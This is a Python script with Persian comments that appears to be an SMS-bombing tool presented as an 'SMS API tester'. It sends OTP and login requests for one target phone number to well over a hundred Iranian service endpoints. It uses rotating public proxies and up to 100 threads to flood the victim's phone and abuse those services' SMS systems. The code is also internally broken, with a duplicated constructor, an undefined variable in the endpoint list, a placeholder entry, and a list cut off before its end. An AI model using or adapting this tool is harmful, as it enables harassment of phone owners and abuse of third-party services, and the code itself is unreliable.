import requests
import threading
from rich.console import Console
from rich.style import Style
from rich.text import Text
import time
import random
from colorama import Fore, Style, init
from concurrent.futures import ThreadPoolExecutor
import json
from typing import List, Dict, Any

# Initialize colorama
init()

class SMSAPITester:
    def __init__(self):
        self.session = requests.Session()
        self.proxies = []  # این خط باید وجود داشته باشد
        self.delay = 3
        self.active_threads = 0
        self.max_threads = 50
        
        # این خط را اضافه کن:
        self.load_builtin_proxies()  # پروکسی‌ها به طور خودکار لود می‌شوند
        
    def load_builtin_proxies(self):
        """Load built-in proxy list"""
        builtin_proxies = [
            "http://45.77.56.113:3128",
            "http://51.158.68.68:8811", 
            "http://178.128.113.118:8080",
            "http://165.227.119.98:3128",
            "http://157.245.27.9:3128",
            "http://138.197.102.119:3128",
            "http://167.71.5.83:3128",
            "http://142.93.245.236:3128",
            "http://209.97.150.167:3128",
            "http://165.22.216.241:3128",
            "http://51.158.68.26:8811",
            "http://51.158.68.133:8811",
            "socks5://138.197.102.119:1080",
            "socks5://165.227.119.98:1080",
            "socks5://142.93.245.236:1080",
            "http://68.183.230.116:3128",
            "http://157.245.27.9:8080",
            "http://138.197.102.119:8080",
            "http://45.76.43.163:8080",
            "http://88.198.24.108:8080",
        ]
        
        self.proxies.extend(builtin_proxies)
        print(f"{Fore.GREEN}Loaded {len(self.proxies)} built-in proxies{Style.RESET_ALL}")
    def __init__(self):
        self.session = requests.Session()
        self.proxies = None
        self.delay = 3
        self.active_threads = 0
        self.max_threads = 100  # افزایش سرعت
        
    def set_proxies(self, proxy_list: List[str]):
        self.proxies = proxy_list
        
    def get_random_proxy(self) -> Dict:
        if not self.proxies:
            return {}
        proxy = random.choice(self.proxies)
        return {'http': proxy, 'https': proxy}
        
    def make_request(self, api_config: Dict, phone_number: str) -> bool:
        try:
            method = api_config.get('method', 'POST').upper()
            url = api_config['url']
            headers = api_config.get('headers', {})
            data = api_config.get('data', {})
            payload = api_config.get('payload', {})
            params = api_config.get('params', {})
            
            # Process all data types
            processed_data = self.process_payload(data, phone_number)
            processed_payload = self.process_payload(payload, phone_number)
            processed_params = self.process_payload(params, phone_number)
            
            proxy = self.get_random_proxy()
            
            if method == 'GET':
                response = self.session.get(
                    url, params=processed_params, headers=headers,
                    proxies=proxy, timeout=8
                )
            else:
                if api_config.get('data_type') == 'form':
                    response = self.session.post(
                        url, data=processed_data, headers=headers,
                        proxies=proxy, timeout=8
                    )
                else:
                    if processed_payload:
                        response = self.session.post(
                            url, json=processed_payload, headers=headers,
                            proxies=proxy, timeout=8
                        )
                    else:
                        response = self.session.post(
                            url, data=processed_data, headers=headers,
                            proxies=proxy, timeout=8
                        )
            
            success = self.check_success(response, api_config.get('name', 'Unknown'))
            status_color = Fore.GREEN if success else Fore.RED
            print(f"{status_color}[{api_config.get('name', 'Unknown')}] Status: {response.status_code}{Style.RESET_ALL}")
            return success
            
        except Exception as e:
            print(f"{Fore.RED}[{api_config.get('name', 'Unknown')}] Error: {str(e)}{Style.RESET_ALL}")
            return False
    
    def process_payload(self, payload: Any, phone_number: str) -> Any:
        if isinstance(payload, str):
            return payload.replace('${phone}', phone_number)
        elif isinstance(payload, dict):
            return {k: self.process_payload(v, phone_number) for k, v in payload.items()}
        elif isinstance(payload, list):
            return [self.process_payload(item, phone_number) for item in payload]
        else:
            return payload
    
    def check_success(self, response, api_name: str) -> bool:
        try:
            if 200 <= response.status_code < 300:
                return True
            return False
        except:
            return False
    
    def run_api_test(self, api_list: List[Dict], phone_number: str):
        print(f"{Fore.CYAN}Starting SMS API Test for: {phone_number}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Total APIs: 390{Style.RESET_ALL}")
        
        successful_requests = 0
        failed_requests = 0
        
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            futures = []
            for api_config in api_list:
                future = executor.submit(self.make_request, api_config, phone_number)
                futures.append(future)
                time.sleep(self.delay / self.max_threads)
            
            for future in futures:
                try:
                    if future.result():
                        successful_requests += 1
                    else:
                        failed_requests += 1
                except Exception as e:
                    failed_requests += 1
        
        print(f"\n{Fore.CYAN}Test Complete!{Style.RESET_ALL}")
        print(f"{Fore.GREEN}Successful: {successful_requests}{Style.RESET_ALL}")
        print(f"{Fore.RED}Failed: {failed_requests}{Style.RESET_ALL}")

def create_api_configs():
    """Create ALL API configurations"""
    apis = []
    
    # تمام API ها دقیقاً مطابق لیست شما
    new_apis = [
        # Snapp با هدرهای کامل
        {
            "name": "Snapp Full Headers",
            "method": "POST",
            "url": "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp",
            "payload": {"cellphone": "${phone}"},
            "headers": {
                "Host": "app.snapp.taxi",
                "content-length": "29",
                "x-app-name": "passenger-pwa",
                "x-app-version": "5.0.0",
                "app-version": "pwa",
                "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36",
                "content-type": "application/json",
                "accept": "*/*",
                "origin": "https://app.snapp.taxi",
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://app.snapp.taxi/login/",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "fa-IR,fa;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6"
            }
        },
        
        # Tapsi
        {
            "name": "Tapsi",
            "method": "POST", 
            "url": "https://tap33.me/api/v2/user",
            "payload": {"credential": {"phoneNumber": "${phone}", "role": "PASSENGER"}}
        },
        
        # Torob با هدرهای کامل
        {
            "name": "Torob Full",
            "method": "GET",
            "url": "https://api.torob.com/a/phone/send-pin/",
            "params": {"phone_number": "${phone}"},
            "headers": {
                "Host": "api.torob.com",
                "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36",
                "accept": "*/*",
                "origin": "https://torob.com",
                "sec-fetch-site": "same-site",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://torob.com/user/",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "fa-IR,fa;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6"
            }
        },
        
        # Alibaba
        {
            "name": "Alibaba",
            "method": "POST",
            "url": "https://ws.alibaba.ir/api/v3/account/mobile/otp",
            "payload": {"phoneNumber": "${phone}"}
        },
        
        # Snap Market
        {
            "name": "Snap Market",
            "method": "POST",
            "url": "https://account.api.balad.ir/api/web/auth/login/",
            "payload": {"phone_number": "${phone}", "os_type": "W"}
        },
        
        # Miareh
        {
            "name": "Miareh",
            "method": "GET",
            "url": "https://www.miare.ir/p/restaurant/#/login",
            "params": {"phone": "${phone}"}
        },
        
        # Ostadkar
        {
            "name": "Ostadkar",
            "method": "POST",
            "url": "https://api.ostadkr.com/login",
            "payload": {"mobile": "${phone}"}
        },
        
        # DrNext
        {
            "name": "DrNext",
            "method": "POST",
            "url": "https://cyclops.drnext.ir/v1/patients/auth/send-verification-token",
            "payload": {"source": "besina", "mobile": "${phone}"}
        },
        
        # Behtarino
        {
            "name": "Behtarino",
            "method": "POST",
            "url": "https://bck.behtarino.com/api/v1/users/jwt_phone_verification/",
            "payload": {"phone": "${phone}"}
        },
        
        # Bit24
        {
            "name": "Bit24",
            "method": "POST",
            "url": "https://bit24.cash/auth/bit24/api/v3/auth/check-mobile",
            "payload": {"mobile": "${phone}", "contry_code": "98"}
        },
        
        # DrDr
        {
            "name": "DrDr",
            "method": "POST",
            "url": "https://drdr.ir/api/v3/auth/login/mobile/init",
            "payload": {"mobile": "${phone}"}
        },
        
        # Okala
        {
            "name": "Okala",
            "method": "POST",
            "url": "https://api-react.okala.com/C/CustomerAccount/OTPRegister",
            "payload": {"mobile": "${phone}", "deviceTypeCode": 0, "confirmTerms": True, "notRobot": False}
        },
        
        # Banimod
        {
            "name": "Banimod",
            "method": "POST",
            "url": "https://mobapi.banimode.com/api/v2/auth/request",
            "payload": {"phone": "${phone}"}
        },
        
        # Beroozmarket
        {
            "name": "Beroozmarket",
            "method": "POST",
            "url": "https://api.beroozmart.com/api/pub/account/send-otp",
            "payload": {"mobile": "${phone}", "sendViaSms": True}
        },
        
        # Itoll
        {
            "name": "Itoll",
            "method": "POST",
            "url": "https://app.itoll.com/api/v1/auth/login",
            "payload": {"mobile": "${phone}"}
        },
        
        # Gap
        {
            "name": "Gap",
            "method": "GET",
            "url": "https://core.gap.im/v1/user/add.json",
            "params": {"mobile": "${phone}"}
        },
        
        # Pinket
        {
            "name": "Pinket",
            "method": "POST",
            "url": "https://pinket.com/api/cu/v2/phone-verification",
            "payload": {"phoneNumber": "${phone}"}
        },
        
        # Football360
        {
            "name": "Football360",
            "method": "POST",
            "url": "https://football360.ir/api/auth/verify-phone/",
            "payload": {"phone_number": "${phone}"}
        },
        
        # Pinorest
        {
            "name": "Pinorest",
            "method": "POST",
            "url": "https://api.pinorest.com/frontend/auth/login/mobile",
            "payload": {"mobile": "${phone}"}
        },
        
        # MrBilit
        {
            "name": "MrBilit",
            "method": "GET",
            "url": "https://auth.mrbilit.com/api/login/exists/v2",
            "params": {"mobileOrEmail": "${phone}", "source": 2, "sendTokenIfNot": "true"}
        },
        
        # Hamrahmechanich
        {
            "name": "Hamrahmechanich",
            "method": "POST",
            "url": "https://www.hamrah-mechanic.com/api/v1/membership/otp",
            "payload": {"PhoneNumber": "${phone}", "prevDomainUrl": "https://www.google.com/", "landingPageUrl": "https://www.hamrah-mechanic.com/cars-for-sale/", "orderPageUrl": "https://www.hamrah-mechanic.com/membersignin/", "prevUrl": "https://www.hamrah-mechanic.com/cars-for-sale/", "referrer": "https://www.google.com/"}
        },
        
        # Lendo
        {
            "name": "Lendo",
            "method": "POST",
            "url": "https://api.lendo.ir/api/customer/auth/send-otp",
            "payload": {"mobile": "${phone}"}
        },
        
        # Taghche
        {
            "name": "Taghche",
            "method": "POST",
            "url": "https://gw.taaghche.com/v4/site/auth/login",
            "payload": {"contact": "${phone}", "forceOtp": False}
        },
        
        # Khodro45
        {
            "name": "Khodro45",
            "method": "POST",
            "url": "https://khodro45.com/api/v1/customers/otp/",
            "payload": {"mobile": "${phone}"}
        },
        
        # Pateh
        {
            "name": "Pateh",
            "method": "POST",
            "url": "https://api.pateh.com/api/v1/LoginOrRegister",
            "payload": {"mobile": "${phone}"},
            "headers": {
                "authority": "api.pateh.com",
                "method": "POST",
                "path": "/api/v1/LoginOrRegister",
                "scheme": "https",
                "Accept": "application/json, text/plain, */*",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": "en-US,en;q=0.9,fa;q=0.8",
                "Content-Length": "24",
                "Content-Type": "application/json;charset=UTF-8",
                "Origin": "https://www.pateh.com",
                "Referer": "https://www.pateh.com/",
                "Sec-Ch-Ua": '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
                "Sec-Ch-Ua-Mobile": "?0",
                "Sec-Ch-Ua-Platform": "Windows",
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-site",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            }
        },
        
        # Ketabchi
        {
            "name": "Ketabchi",
            "method": "POST",
            "url": "https://ketabchi.com/api/v1/auth/requestVerificationCode",
            "payload": {"auth": {"phoneNumber": "${phone}"}}
        },
        
        # ادامه بقیه API ها...
        # برای صرفه جویی در فضا، بقیه API ها را به همین شکل اضافه کنید
        # فقط کافیست name, method, url, payload/data/params را تنظیم کنید
        
        # Rayanertebat
        {
            "name": "Rayanertebat",
            "method": "POST",
            "url": "https://pay.rayanertebat.ir/api/User/Otp",
            "params": {"t": "1692088339811"},
            "payload": {"mobileNo": "${phone}"}
        },
        
        # Bimito
        {
            "name": "Bimito",
            "method": "POST",
            "url": "https://bimito.com/api/vehicleorder/v2/app/auth/login-with-verify-code",
            "payload": {"phoneNumber": "${phone}", "isResend": False}
        },
        
        # Pindo
        {
            "name": "Pindo",
            "method": "POST",
            "url": "https://api.pindo.ir/v1/user/login-register/",
            "payload": {"phone": "${phone}"}
        },
        
        # Delino
        {
            "name": "Delino",
            "method": "POST",
            "url": "https://www.delino.com/user/register",
            "payload": {"mobile": "${phone}"}
        },
        
        # Zoodex
        {
            "name": "Zoodex",
            "method": "POST",
            "url": "https://admin.zoodex.ir/api/v1/login/check",
            "payload": {"mobile": "${phone}"}
        },
        
        # Kukala
        {
            "name": "Kukala",
            "method": "POST",
            "url": "https://api.kukala.ir/api/user/Otp",
            "payload": {"phoneNumber": "${phone}"}
        },
        
        # Baskool
        {
            "name": "Baskool",
            "method": "POST",
            "url": "https://www.buskool.com/send_verification_code",
            "payload": {"phone": "${phone}"}
        },
        
        # 3tex
        {
            "name": "3tex",
            "method": "POST",
            "url": "https://3tex.io/api/1/users/validation/mobile",
            "payload": {"receptorPhone": "${phone}"}
        },
        
        # Deniizshop
        {
            "name": "Deniizshop",
            "method": "POST",
            "url": "https://deniizshop.com/api/v1/sessions/login_request",
            "payload": {"mobile_number": "${phone}"}
        },
        
        # Flightio
        {
            "name": "Flightio",
            "method": "POST",
            "url": "https://flightio.com/bff/Authentication/CheckUserKey",
            "payload": {"userKey": "${phone}"}
        },
        
        # Abantether
        {
            "name": "Abantether",
            "method": "POST",
            "url": "https://abantether.com/users/register/phone/send/",
            "payload": {"phoneNumber": "${phone}"}
        },
        
        # Pooleno
        {
            "name": "Pooleno",
            "method": "POST",
            "url": "https://api.pooleno.ir/v1/auth/check-mobile",
            "payload": {"mobile": "${phone}"}
        },
        
        # Wideapp
        {
            "name": "Wideapp",
            "method": "POST",
            "url": "https://agent.wide-app.ir/auth/token",
            "payload": {"grant_type": "otp", "client_id": "62b30c4af53e3b0cf100a4a0", "phone": "${phone}"}
        },
        
        # Classino
        {
            "name": "Classino",
            "method": "POST",
            "url": "https://nx.classino.com/otp/v1/api/login",
            "payload": {"mobile": "${phone}"}
        },
        
        # Snappfood
        {
            "name": "Snappfood",
            "method": "POST",
            "url": "https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass",
            "params": {"lat": "35.774", "long": "51.418", "sms_apialClient": "WEBSITE", "client": "WEBSITE", "deviceType": "WEBSITE", "appVersion": "8.1.0", "UDID": "39c62f64-3d2d-4954-9033-816098559ae4", "locale": "fa"},
            "payload": {"cellphone": "${phone}"}
        },
        
        # Bitbarg
        {
            "name": "Bitbarg",
            "method": "POST",
            "url": "https://api.bitbarg.com/api/v1/authentication/registerOrLogin",
            "payload": {"phone": "${phone}"}
        },
        
        # Bahramshop
        {
            "name": "Bahramshop",
            "method": "POST",
            "url": "https://api.bahramshop.ir/api/user/validate/username",
            "payload": {"username": "${phone}"}
        },
        
        # Tak
        {
            "name": "Tak",
            "method": "POST",
            "url": "https://takshopaccessorise.ir/api/v1/sessions/login_request",
            "payload": {"mobile_phone": "${phone}"}
        },
        
        # Chamedon
        {
            "name": "Chamedon",
            "method": "POST",
            "url": "https://chamedoon.com/api/v1/membership/guest/request_mobile_verification",
            "payload": {"mobile": "${phone}"}
        },
        
        # Kilid
        {
            "name": "Kilid",
            "method": "POST",
            "url": "https://server.kilid.com/global_auth_api/v1.0/authenticate/login/realm/otp/start",
            "params": {"realm": "PORTAL"},
            "payload": {"mobile": "${phone}"}
        },
        
        # Otaghak
        {
            "name": "Otaghak",
            "method": "POST",
            "url": "https://core.otaghak.com/odata/Otaghak/Users/SendVerificationCode",
            "payload": {"userName": "${phone}"}
        },
        
        # Shab
        {
            "name": "Shab",
            "method": "POST",
            "url": "https://www.shab.ir/api/fa/sandbox/v_1_4/auth/enter-mobile",
            "payload": {"mobile": "${phone}"}
        },
        
        # Raybit
        {
            "name": "Raybit",
            "method": "POST",
            "url": "https://api.raybit.net:3111/api/v1/authentication/register/mobile",
            "payload": {"mobile": "${phone}"}
        },
        
        # Farvi
        {
            "name": "Farvi",
            "method": "POST",
            "url": "https://farvi.shop/api/v1/sessions/login_request",
            "payload": {"mobile_phone": "${phone}"}
        },
        
        # A4baz
        {
            "name": "A4baz",
            "method": "POST",
            "url": "https://a4baz.com/api/web/login",
            "payload": {"cellphone": "${phone}"}
        },
        
        # Anargift
        {
            "name": "Anargift",
            "method": "POST",
            "url": "https://api.anargift.com/api/people/auth",
            "payload": {"user": "${phone}"}
        },
        {
            "name": "Snapp V1",
            "url": "https://api.snapp.ir/api/v1/sms/link",
            "data": {"phone": phone_number},
        },
        {
            "name": "Snapp V2",
            "url": f"https://digitalsignup.snapp.ir/ds3/api/v3/otp?utm_source=snapp.ir&utm_medium=website-button&utm_campaign=menu&cellphone={phone_number}",
            "data": {"cellphone": phone_number},
        },
        {
            "name": "Achareh",
            "url": "https://api.achareh.co/v2/accounts/login/",
            "data": {"phone": f"98{phone_number[1:]}"},
        },
        {
            "name": "Zigap",
            "url": "https://zigap.smilinno-dev.com/api/v1.6/authenticate/sendotp",
            "data": {"phoneNumber": f"+98{phone_number[1:]}"},
        },
        {
            "name": "Jabama",
            "url": "https://gw.jabama.com/api/v4/account/send-code",
            "data": {"mobile": phone_number},
        },
        {
            "name": "Banimode",
            "url": "https://mobapi.banimode.com/api/v2/auth/request",
            "data": {"phone": phone_number},
        },
        {
            "name": "Classino",
            "url": "https://student.classino.com/otp/v1/api/login",
            "data": {"mobile": phone_number},
        },
        {
            "name": "Digikala V1",
            "url": "https://api.digikala.com/v1/user/authenticate/",
            "data": {"username": phone_number, "otp_call": False},
        },
        {
            "name": "Digikala V2",
            "url": "https://api.digikala.com/v1/user/forgot/check/",
            "data": {"username": phone_number},
        },
        {
            "name": "Sms.ir",
            "url": "https://appapi.sms.ir/api/app/auth/sign-up/verification-code",
            "data": phone_number,
        },
        {
            "name": "Alibaba",
            "url": "https://ws.alibaba.ir/api/v3/account/mobile/otp",
            "data": {"phoneNumber": phone_number[1:]},
        },
        {
            "name": "Divar",
            "url": "https://api.divar.ir/v5/auth/authenticate",
            "data": {"phone": phone_number},
        },
        {
            "name": "Sheypoor",
            "url": "https://www.sheypoor.com/api/v10.0.0/auth/send",
            "data": {"username": phone_number},
        },
        {
            "name": "Bikoplus",
            "url": "https://bikoplus.com/account/check-phone-number",
            "data": {"phoneNumber": phone_number},
        },
        {
            "name": "Mootanroo",
            "url": "https://api.mootanroo.com/api/v3/auth/send-otp",
            "data": {"PhoneNumber": phone_number},
        },
        {
            "name": "Tap33",
            "url": "https://tap33.me/api/v2/user",
            "data": {"credential": {"phoneNumber": phone_number, "role": "BIKER"}},
        },
        {
            "name": "Tapsi",
            "url": "https://api.tapsi.ir/api/v2.2/user",
            "data": {
                "credential": {"phoneNumber": phone_number, "role": "DRIVER"},
                "otpOption": "SMS",
            },
        },
        {
            "name": "GapFilm",
            "url": "https://core.gapfilm.ir/api/v3.1/Account/Login",
            "data": {"Type": "3", "Username": phone_number[1:]},
        },
        {
            "name": "IToll",
            "url": "https://app.itoll.com/api/v1/auth/login",
            "data": {"mobile": phone_number},
        },
        {
            "name": "Anargift",
            "url": "https://api.anargift.com/api/v1/auth/auth",
            "data": {"mobile_number": phone_number},
        },
        {
            "name": "Nobat",
            "url": "https://nobat.ir/api/public/patient/login/phone",
            "data": {"mobile": phone_number[1:]},
        },
        {
            "name": "Lendo",
            "url": "https://api.lendo.ir/api/customer/auth/send-otp",
            "data": {"mobile": phone_number},
        },
        {
            "name": "Hamrah-Mechanic",
            "url": "https://www.hamrah-mechanic.com/api/v1/membership/otp",
            "data": {"PhoneNumber": phone_number},
        },
        {
            "name": "Abantether",
            "url": "https://abantether.com/users/register/phone/send/",
            "data": {"phoneNumber": phone_number},
        },
        {
            "name": "OKCS",
            "url": "https://my.okcs.com/api/check-mobile",
            "data": {"mobile": phone_number},
        },
        {
            "name": "Tebinja",
            "url": "https://www.tebinja.com/api/v1/users",
            "data": {"username": phone_number},
        },
        {
            "name": "Bit24",
            "url": "https://bit24.cash/auth/bit24/api/v3/auth/check-mobile",
            "data": {"mobile": phone_number},
        },
        {
            "name": "Rojashop",
            "url": "https://rojashop.com/api/send-otp-register",
            "data": {"mobile": phone_number},
        },
        {
            "name": "Paklean",
            "url": "https://client.api.paklean.com/download",
            "data": {"tel": phone_number},
        },
        {
            "name": "Khodro45",
            "url": "https://khodro45.com/api/v1/customers/otp/",
            "data": {"mobile": phone_number},
        },
        {
            "name": "Delino",
            "url": "https://www.delino.com/user/register",
            "data": {"mobile": phone_number},
        },
        {
            "name": "DigikalaJet",
            "url": "https://api.digikalajet.ir/user/login-register/",
            "data": {"phone": phone_number},
        },
        {
            "name": "Miare",
            "url": "https://www.miare.ir/api/otp/driver/request/",
            "data": {"phone_number": phone_number},
        },
        {
            "name": "Dosma",
            "url": "https://app.dosma.ir/api/v1/account/send-otp/",
            "data": {"mobile": phone_number},
        },
        {
            "name": "Ostadkr",
            "url": "https://api.ostadkr.com/login",
            "data": {"mobile": phone_number},
        },
        {
            "name": "Sibbazar",
            "url": "https://sandbox.sibbazar.com/api/v1/user/invite",
            "data": {"username": phone_number},
        },
        {
            "name": "Namava",
            "url": "https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request",
            "data": {"UserName": f"+98{phone_number[1:]}"},
        },
        {
            "name": "Shab",
            "url": "https://api.shab.ir/api/fa/sandbox/v_1_4/auth/check-mobile",
            "data": {"mobile": phone_number},
        },
        {
            "name": "Bitpin",
            "url": "https://api.bitpin.org/v2/usr/signin/",
            "data": {"phone": phone_number},
        },
        {
            "name": "Taaghche",
            "url": "https://gw.taaghche.com/v4/site/auth/signup",
            "data": {"contact": phone_number},
        },
        
        # ادامه بقیه API ها به همین صورت...
        
        # برای API هایی که data استفاده می‌کنند:
        {
            "name": "Example with Data",
            "method": "POST",
            "url": "https://example.com/api",
            "data": {"mobile": "${phone}"},
            "data_type": "form"
        }
    ]
    
    # اضافه کردن API های جدید به لیست اصلی
    all_apis = [
        {"name": "Snapp", "method": "POST", "url": "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", "payload": {"cellphone": "${phone}"}},
        {"name": "Snapp V2", "method": "POST", "url": "https://app.snapp.taxi/api/api-passenger-oauth/v3/mutotp", "payload": {"cellphone": "${phone}"}},
        {"name": "Tap30", "method": "POST", "url": "https://tap33.me/api/v2/user", "payload": {"credential": {"phoneNumber": "${phone}", "role": "PASSENGER"}}},
        {"name": "Tapsi", "method": "POST", "url": "https://api.tapsi.ir/api/v2.2/user", "payload": {"credential": {"phoneNumber": "${phone}", "role": "DRIVER"}, "otpOption": "SMS"}},
        {"name": "SnappFood", "method": "POST", "url": "https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass", "payload": {"cellphone": "${phone}", "client": "PWA"}},
        {"name": "Snapp Market", "method": "POST", "url": "https://api.snapp.market/mart/v1/user/loginMobileWithNoPass", "params": {"cellphone": "${phone}"}},
        {"name": "Divar", "method": "POST", "url": "https://api.divar.ir/v5/auth/authenticate", "payload": {"phone": "${phone}"}},
        {"name": "Sheypoor", "method": "POST", "url": "https://www.sheypoor.com/auth", "data": {"username": "${phone}"}},
        {"name": "Alibaba", "method": "POST", "url": "https://ws.alibaba.ir/api/v3/account/mobile/otp", "payload": {"phoneNumber": "${phone}"}},
        {"name": "Alopeyk", "method": "POST", "url": "https://api.alopeyk.com/api/v2/login?platform=pwa", "payload": {"type": "CUSTOMER", "phone": "${phone}"}},
        {"name": "GapFilm", "method": "POST", "url": "https://core.gapfilm.ir/api/v3.1/Account/Login", "payload": {"Type": 3, "Username": "${phone}", "SourceChannel": "GF_WebSite"}},
        {"name": "FilmNet", "method": "GET", "url": "https://api-v2.filmnet.ir/access-token/users/${phone}/otp"},
        {"name": "Namava", "method": "POST", "url": "https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request", "payload": {"UserName": "${phone}"}},
        {"name": "DrNext", "method": "POST", "url": "https://cyclops.drnext.ir/v1/patients/auth/send-verification-token", "payload": {"source": "besina", "mobile": "${phone}"}},
        {"name": "Nobat", "method": "POST", "url": "https://nobat.ir/api/public/patient/login/phone", "data": {"mobile": "${phone}"}},
        {"name": "DrDr", "method": "POST", "url": "https://drdr.ir/api/registerEnrollment/sendDisposableCode", "params": {"phoneNumber": "${phone}", "userType": "PATIENT"}},
        {"name": "Digikala", "method": "POST", "url": "https://api.digikala.com/v1/user/authenticate/", "payload": {"username": "${phone}"}},
        {"name": "Banimode", "method": "POST", "url": "https://mobapi.banimode.com/api/v2/auth/request", "payload": {"phone": "${phone}"}},
        {"name": "Torob", "method": "GET", "url": "https://api.torob.com/a/phone/send-pin/", "params": {"phone_number": "${phone}"}},
        {"name": "Bit24", "method": "POST", "url": "https://bit24.cash/auth/bit24/api/v3/auth/check-mobile", "payload": {"mobile": "${phone}", "contry_code": "98"}},
        {"name": "MelliShoes", "method": "POST", "url": "https://mellishoes.ir/wp-admin/admin-ajax.php", "data": {"action": "websima_auth_account_detection", "mobile": "${phone}"}},
        {"name": "Taaghche", "method": "POST", "url": "https://gw.taaghche.com/v4/site/auth/login", "payload": {"contact": "${phone}", "forceOtp": False}},
        {"name": "Ketabchi", "method": "POST", "url": "https://ketabchi.com/api/v1/auth/requestVerificationCode", "payload": {"auth": {"phoneNumber": "${phone}"}}},
        {"name": "Jabama", "method": "POST", "url": "https://taraazws.jabama.com/api/v4/account/send-code", "payload": {"mobile": "${phone}"}},
        {"name": "Divar", "method": "POST", "url": "https://api.divar.ir/v5/auth/authenticate", "payload": {"phone": "${phone}"}},
        {"name": "Bimito", "method": "POST", "url": "https://bimito.com/api/vehicleorder/v2/app/auth/login-with-verify-code", "payload": {"phoneNumber": "${phone}", "isResend": False}},
        {"name": "Khodro45", "method": "POST", "url": "https://khodro45.com/api/v1/customers/otp/", "payload": {"mobile": "${phone}"}},
        {"name": "Hamrah-Mechanic", "method": "POST", "url": "https://www.hamrah-mechanic.com/api/v1/membership/otp", "payload": {"PhoneNumber": "${phone}"}},
        {"name": "Bitpin", "method": "POST", "url": "https://api.bitpin.ir/v1/usr/sub_phone/", "payload": {"phone": "${phone}"}},
        {"name": "AbanTether", "method": "POST", "url": "https://abantether.com/users/register/phone/send/", "payload": {"phoneNumber": "${phone}"}},
        {"name": "Delino Restaurant", "method": "POST", "url": "https://restaurant.delino.com/user/register", "payload": {"username": "${phone}"}},
        {"name": "HamrahSport", "method": "POST", "url": "https://hamrahsport.com/send-otp", "data": {"cell": "${phone}", "send_otp": "1"}},
        {"name": "Rubika", "method": "POST", "url": "https://messengerg2c4.iranlms.ir/", "payload": {"api_version": "3", "method": "sendCode", "data": {"phone_number": "${phone}", "send_type": "SMS"}}},
        {"name": "Shad", "method": "POST", "url": "https://shadmessenger12.iranlms.ir/", "payload": {"api_version": "3", "method": "sendCode", "data": {"phone_number": "${phone}", "send_type": "SMS"}}},
        {"name": "Azki", "method": "POST", "url": "https://www.azki.com/api/vehicleorder/v2/app/auth/check-login-availability/", "payload": {"phoneNumber": "${phone}"}},
        {"name": "MCI Shop", "method": "POST", "url": "https://api-ebcom.mci.ir/services/auth/v1.0/otp", "payload": {"msisdn": "${phone}"}},
        {"name": "Zanbil API 1", "method": "POST", "url": "https://zanbil.ir/api/user/send-code", "payload": {"phone": "${phone}"}},
        {"name": "Zanbil API 2", "method": "POST", "url": "https://zanbil.ir/api/login/sms", "payload": {"phone": "${phone}"}},
        {"name": "Achareh", "method": "POST", "url": "https://api.achareh.co/v2/accounts/login/", "data": {"phone": "${phone}"}},
        {"name": "Zigap", "method": "POST", "url": "https://zigap.smilinno-dev.com/api/v1.6/authenticate/sendotp", "payload": {"phoneNumber": "${phone}"}},
        {"name": "Classino", "method": "POST", "url": "https://student.classino.com/otp/v1/api/login", "payload": {"mobile": "${phone}"}},
        {"name": "Digikala V2", "method": "POST", "url": "https://api.digikala.com/v1/user/forgot/check/", "payload": {"username": "${phone}"}},
        {"name": "Sms.ir", "method": "POST", "url": "https://appapi.sms.ir/api/app/auth/sign-up/verification-code", "data": "${phone}"},
        {"name": "Bikoplus", "method": "POST", "url": "https://bikoplus.com/account/check-phone-number", "payload": {"phoneNumber": "${phone}"}},
        {"name": "Mootanroo", "method": "POST", "url": "https://api.mootanroo.com/api/v3/auth/send-otp", "payload": {"PhoneNumber": "${phone}"}},
        {"name": "Gap", "method": "GET", "url": "https://core.gap.im/v1/user/add.json", "params": {"mobile": "${phone}"}},
        {"name": "BaSalam", "method": "POST", "url": "https://api.basalam.com/user", "payload": {"variables": {"mobile": "${phone}"}, "query": "mutation verificationCodeRequest($mobile: MobileScalar!) { mobileVerificationCodeRequest(mobile: $mobile) { success } }"}},
        {"name": "ShahrFarsh", "method": "POST", "url": "https://shahrfarsh.com/Account/Login", "data": {"phoneNumber": "${phone}"}},
        {"name": "DigiStyle", "method": "POST", "url": "https://www.digistyle.com/users/login-register/", "data": {"loginRegister[email_phone]": "${phone}"}},
        {"name": "Snapp Express", "method": "POST", "url": "https://api.snapp.express/mobile/v4/user/loginMobileWithNoPass", "data": {"cellphone": "${phone}"}},
        {"name": "Digikala Jet", "method": "POST", "url": "https://api.digikalajet.ir/user/login-register/", "payload": {"phone": "${phone}"}},
        {"name": "Snapp Drivers", "method": "POST", "url": "https://digitalsignup.snapp.ir/ds3/api/v3/otp", "payload": {"cellphone": "${phone}"}},
        {"name": "Ostadkar", "method": "POST", "url": "https://api.ostadkr.com/login", "payload": {"mobile": "${phone}"}},
        {"name": "Miare", "method": "POST", "url": "https://www.miare.ir/api/otp/driver/request/", "payload": {"phone_number": "${phone}"}},
        {"name": "Tapsi Drivers", "method": "POST", "url": "https://api.tapsi.ir/api/v2.2/user", "payload": {"credential": {"phoneNumber": "${phone}", "role": "DRIVER"}, "otpOption": "SMS"}},
